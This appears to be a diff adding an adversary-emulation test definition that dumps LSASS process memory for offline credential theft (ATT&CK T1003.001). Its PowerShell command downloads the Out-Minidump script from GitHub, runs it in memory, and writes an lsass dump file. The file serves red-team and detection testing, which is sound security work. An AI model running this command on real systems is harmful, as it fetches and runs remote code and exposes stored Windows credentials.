@@ -1,0 +1,31 @@
+---
+- id: 60bb6f8468aa98b75be2521861a164d5
+  name: Dump LSASS.exe Memory using Out-Minidump.ps1
+  description: 'The memory of lsass.exe is often dumped for offline credential theft
+    attacks. This test leverages a pure
+
+    powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+
+    Upon successful execution, you should see the following file created $env:TEMP\lsass_*.dmp.
+
+
+    Author of Out-Minidump: Matthew Graeber (@mattifestation)
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction
+          Ignore -Force | Out-Null; try{ IEX (IWR ''https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1'')
+          -ErrorAction Stop}; catch{ $_; exit $_.Exception.Response.StatusCode.Value__};
+          get-process lsass | Out-Minidump'
+        payloads: []
+        cleanup: Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
